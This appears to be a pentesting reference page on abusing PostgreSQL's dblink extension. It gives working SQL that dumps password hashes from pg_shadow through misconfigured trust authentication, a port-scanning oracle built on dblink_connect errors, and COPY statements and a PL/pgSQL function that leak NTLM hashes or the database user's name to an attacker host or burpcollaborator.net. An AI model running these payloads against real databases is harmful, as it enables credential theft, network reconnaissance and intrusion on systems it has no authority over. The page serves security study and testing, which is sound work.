# Network - Privilege Escalation, Port Scanning, and NTLM Challenge-Response Disclosure

{{#include ../../../banners/hacktricks-training.md}}

**Find** [**more information about these attacks in the original paper**](http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt).<sup>[[1]](#references)</sup>

Since **PostgreSQL 9.1**, registered extensions such as `dblink` can be installed with `CREATE EXTENSION` when the database role has the required privilege.<sup>[[5]](#references)[[6]](#references)</sup>

```sql
CREATE EXTENSION dblink;
```

Once you have dblink loaded you could be able to perform some interesting tricks:

### Privilege Escalation

The file `pg_hba.conf` can be misconfigured to trust local connections without a password. Rules are matched by connection type, address, database, and user; `local` applies to Unix-domain sockets, while `host ... 127.0.0.1/32 trust` applies to loopback TCP. A common Debian/Ubuntu versioned-cluster path is `/etc/postgresql/<major>/main/pg_hba.conf` (for example, `/etc/postgresql/12/main/pg_hba.conf`), but the active path should be confirmed with `SHOW hba_file;` when database access permits it.<sup>[[1]](#references)[[2]](#references)</sup>

```
local    all    all    trust
```

_Note that this configuration is commonly used to modify the password of a db user when the admin forget it, so sometimes you may find it._\
_Note also that the file pg_hba.conf is readable only by postgres user and group and writable only by postgres user._

This case is **useful if** you **already** have a **shell** inside the victim as it will allow you to connect to postgresql database.

Another possible misconfiguration consist on something like this:

```
host    all     all     127.0.0.1/32    trust
```

As it will allow everybody from the localhost to connect to the database as any user.\
In this case and if the **`dblink`** function is **working**, you could **escalate privileges** by connecting to the database through an already established connection and access data shouldn't be able to access:

```sql
SELECT * FROM dblink('host=127.0.0.1
                          user=postgres
                          dbname=postgres',
                         'SELECT datname FROM pg_database')
                      RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
                          user=postgres
                          dbname=postgres',
                         'select usename, passwd from pg_shadow')
                      RETURNS (result1 TEXT, result2 TEXT);
```

### Port Scanning

`dblink_connect` error differences can provide a crude port oracle. `dblink_connect_u()` permits non-superusers to use authentication methods that could expose server credentials, so its execution privilege is revoked from `PUBLIC` by default; it is useful only if a privileged administrator has granted access.<sup>[[1]](#references)[[3]](#references)</sup>

```sql
SELECT * FROM dblink_connect('host=216.58.212.238
                                  port=443
                                  user=name
                                  password=secret
                                  dbname=abc
                                  connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
	Is the server running on host "127.0.0.1" and accepting
	TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```

Note that **before** being able to use `dblink_connect` or `dblink_connect_u` you may need to execute:

```
CREATE extension dblink;
```

### UNC path - NTLM hash disclosure

On a Windows PostgreSQL server, a database-side file access to an attacker-controlled UNC path can cause the PostgreSQL service account to attempt SMB authentication. This requires a role permitted to perform the relevant server-side `COPY` operation and outbound SMB reachability.<sup>[[4]](#references)</sup>

```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```

## References

- [1] [Having Fun With PostgreSQL](http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt)
- [2] [PostgreSQL documentation — Client authentication](https://www.postgresql.org/docs/current/auth-pg-hba-conf.html)
- [3] [PostgreSQL documentation — `dblink_connect_u`](https://www.postgresql.org/docs/current/contrib-dblink-connect-u.html)
- [4] [PostgreSQL documentation — `COPY`](https://www.postgresql.org/docs/current/sql-copy.html)
- [5] [PostgreSQL documentation — Additional supplied modules](https://www.postgresql.org/docs/current/contrib.html)
- [6] [PostgreSQL documentation — `CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html)

{{#include ../../../banners/hacktricks-training.md}}
